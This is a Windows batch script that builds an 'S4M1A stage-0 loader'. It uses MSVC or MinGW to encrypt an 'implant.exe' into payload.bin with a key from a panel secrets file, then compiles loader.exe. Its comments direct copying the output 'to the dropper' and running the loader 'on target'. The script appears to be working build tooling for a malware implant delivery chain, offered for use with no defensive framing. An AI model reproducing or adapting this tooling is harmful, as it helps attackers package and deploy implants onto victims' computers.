@echo off
setlocal EnableDelayedExpansion
cd /d "%~dp0"

rem ================================================================
rem  S4M1A stage-0 loader build
rem  Requires: MSVC cl.exe  OR  MinGW-w64 (x86_64-w64-mingw32-gcc)
rem
rem  1) SET LOADER_KEY to the 64-hex build_key from panel_secrets.json
rem  2) run build_loader.bat
rem  3) result: loader.exe + payload.bin (copy both to the dropper)
rem ================================================================

if "%LOADER_KEY%"=="" (
    echo [!] set LOADER_KEY first, e.g.:
    echo     set LOADER_KEY=REPLACE_WITH_64_HEX_BUILD_KEY
    goto :err
)

set KEY_DEF=-DLOADER_KEY_HEX="%LOADER_KEY%"
set COMPILER=

where cl.exe >nul 2>nul
if not errorlevel 1 set COMPILER=cl

if "%COMPILER%"=="" (
    where x86_64-w64-mingw32-gcc.exe >nul 2>nul
    if not errorlevel 1 set COMPILER=gcc
)

if "%COMPILER%"=="" (
    echo [!] no compiler found - install VS Build Tools ^(cl^) or MinGW-w64
    goto :err
)

echo [*] compiler: %COMPILER%

if "%COMPILER%"=="cl" (
    echo [*] building genpayload.exe
    cl /nologo /O1 /GS- /DMAKE_PAYLOAD %KEY_DEF% loader.c /Fe:genpayload.exe /link bcrypt.lib
    if errorlevel 1 goto :err

    genpayload.exe ..\..\dist\implant.exe %LOADER_KEY% payload.bin
    if errorlevel 1 goto :err

    echo [*] building loader.exe
    cl /nologo /O1 /GS- %KEY_DEF% loader.c /Fe:loader.exe /link bcrypt.lib
    if errorlevel 1 goto :err
) else (
    echo [*] building genpayload.exe
    x86_64-w64-mingw32-gcc -O2 -s -DMAKE_PAYLOAD %KEY_DEF% loader.c -o genpayload.exe -lbcrypt
    if errorlevel 1 goto :err

    genpayload.exe ..\..\dist\implant.exe %LOADER_KEY% payload.bin
    if errorlevel 1 goto :err

    echo [*] building loader.exe
    x86_64-w64-mingw32-gcc -O2 -s %KEY_DEF% loader.c -o loader.exe -lbcrypt
    if errorlevel 1 goto :err
)

del genpayload.exe 2>nul
echo.
echo [*] done: loader.exe + payload.bin
echo [*] deploy both files together; run loader.exe on target
goto :end

:err
echo [!] build failed
:end
endlocal